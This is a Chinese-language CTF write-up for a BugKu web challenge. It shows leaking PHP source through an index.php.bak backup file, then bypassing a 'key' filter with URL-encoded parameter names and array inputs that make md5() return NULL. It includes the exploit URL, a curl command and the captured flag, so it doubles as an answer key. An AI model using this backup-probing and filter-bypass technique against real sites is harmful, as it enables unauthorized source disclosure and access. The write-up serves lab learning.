# BugKu CTF Writeup - 备份是个好习惯

## 题目类型
WEB

## 题目描述
题目名称为“备份是个好习惯”。
<br>打开题目提供的网址，页面显示：
<br>d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e

## 解题过程
<br>1. 寻找备份文件，获取源码
<br>   尝试访问首页 PHP 文件的备份路径：
<br>   http://160.202.254.160:12628/index.php.bak


<br>   .bak 是常见的备份文件后缀。浏览器访问后可能直接下载文件，下载后可以用记事本打开。

<br>   该题备份源码如下：

<br>   php
<br>   <?php
<br>   /**
<br>    * Created by PhpStorm.
<br>    * User: Norse
<br>    * Date: 2017/8/6
<br>    * Time: 20:22
<br>   */

<br>   include_once "flag.php";
<br>   ini_set("display_errors", 0);
<br>   $str = strstr($_SERVER['REQUEST_URI'], '?');
<br>   $str = substr($str,1);
<br>   $str = str_replace('key','',$str);
<br>   parse_str($str);
<br>   echo md5($key1);

<br>   echo md5($key2);
<br>   if(md5($key1) == md5($key2) && $key1 !== $key2){
<br>   echo $flag."取得flag";
<br>   }
<br>   ?>
   

<br>2. 分析参数处理与输出条件

<br>   程序先提取 URL 中 ? 后面的内容：

<br>   php
<br>   $str = strstr($_SERVER['REQUEST_URI'], '?');
<br>   $str = substr($str, 1);
   

<br>   然后删除其中所有的 key，再解析参数：

<br>   php
<br>   $str = str_replace('key', '', $str);
<br>   parse_str($str);
   

<br>   在题目使用的旧版 PHP 中，这种写法的 parse_str() 会把解析结果创建为当前作用域中的变量。

<br>   最后，输出 flag 需要同时满足：

<br>   php
<br>   md5($key1) == md5($key2)
   

<br>   php
<br>   $key1 !== $key2
   

<br>   即两个参数的 MD5 结果比较相等，但两个参数本身不能严格相等。

<br>3. 使用 URL 编码和数组构造参

<br>   如果直接传入：

<br>   text
<br>   ?key1=a&key2=b
   

<br>   key 会被删除，变成：

<br>   text
<br>   ?1=a&2=b
   

<br>   因此，使用 %6b 代替字母 k：

<br>   text
<br>   ?%6bey1=a&%6bey2=b
   

<br>   str_replace() 处理时看不到连续的 key ，不会删除它；之后  parse_str()  进行 URL 解码，参数名才变回 key1 和 key2。

<br>   接着，用 [] 把两个参数设置为数组，并给它们不同的内容：

<br>  ext
<br>   ?%6bey1[]=a&%6bey2[]=b


<br>   解析后的变量相当于：

<br>   php
<br>   $key1 = array("a");
<br>   $key2 = array("b");
   

<br>   在本题的 PHP 5.5 环境中，md5() 接收数组会产生警告并返回 NULL。源码关闭了错误显示，因此页面不会显示这些警告。

<br>   两个判断分别变成：

<br>   php
<br>   NULL == NULL                    // true
<br>   array("a") !== array("b")        // true
   

<br>   两个条件都成立，因此可以输出 flag。

<br>4. 发送请求，取得 flag

<br>   将 [、]分别编码为  %5B 、 %5D ，得到完整请求：

<br>   text
<br>   http://160.202.254.160:12628/index.php?%6bey1%5B%5D=a&%6bey2%5B%5D=b
   

<br>  可以在浏览器中访问，也可以在 Windows 终端运行：

<br>   cmd
<br>   curl.exe --noproxy "*" "http://160.202.254.160:12628/index.php?%6bey1%5B%5D=a&%6bey2%5B%5D=b"
   
<br>  该实例实际返回：

<br>   text
<br>   flag{3bda090926c819bbc3c1bbb435db4a8d}取得flag
   

<br>   提交其中的：

<br>   text
<br>   flag{3bda090926c819bbc3c1bbb435db4a8d}
   

<br>   靶机重新创建后，端口和 flag 可能变化，应以当前实例的地址及返回结果为准。



## 疑问与解答
### 1. 为什么要访问 index.php.bak？
<br>题目名称提示了“备份”，而 .bak 是常见的备份后缀，因此尝试首页脚本的备份文件。

<br>正常访问 .php 文件，服务器通常会执行代码，只返回运行结果；本题的 .php.bak 文件被作为普通文件返回，因此泄露了源码。

### 2. 为什么 %6bey1 能绕过过滤？
<br>关键在于处理顺序：

<br>text
<br>原始参数：%6bey1
<br>        ↓
<br>str_replace 删除 key：没有匹配，参数保持不变
<br>        ↓
<br>parse_str 进行 URL 解码：变成 key1
<br>        ↓
<br>创建变量 $key1


<br>过滤发生在解码之前，所以编码后的参数名避开了过滤。

### 3. 为什么首页有 MD5 值，而最终请求直接显示 flag？


<br>没有传参数时，$key1 和 $key2 未定义。在本题旧版 PHP 环境下，传给 md5() 后得到空字符串的 MD5 值，因此页面显示两遍：

<br>text
<br>d41d8cd98f00b204e9800998ecf8427e


<br>传入数组时，md5() 返回 NULL ，echo NULL 不显示内容，所以页面直接显示 flag。

<br>该行为依赖旧版 PHP。现代 PHP 对这类无效参数可能直接抛出类型错误，不能照搬本题结论。
### 4.| 写法 | 含义 |
<br>|---|---|
<br>| $key1 | 一个变量，用来存放数据 |
<br>| "a" | 字符串，也就是一段文字 |
<br>|  =  | 把右边的值赋给左边的变量 |
<br>|  ;  | 一条语句结束 |
<br>| echo | 把内容输出到网页 |
<br>| if (...) { ... } | 如果括号里的条件成立，就执行大括号里的代码 |

### 5. md5() 是什么？
可以把 MD5 暂时理解成一个给文字生成“指纹”的工具。它通常把字符串变成一个由 32 个十六进制字符组成的结果。

## 笔记
<br>这道题主要学习了：
<br>1. 备份文件泄露：.bak 文件可能暴露服务器端源码。
<br>2. URL 编码绕过：分析过滤和解码的先后顺序，可以找到绕过方式。
<br>3. PHP 类型与比较：理解数组参数、 == 、 !== ，以及旧版函数接收错误类型时的行为。
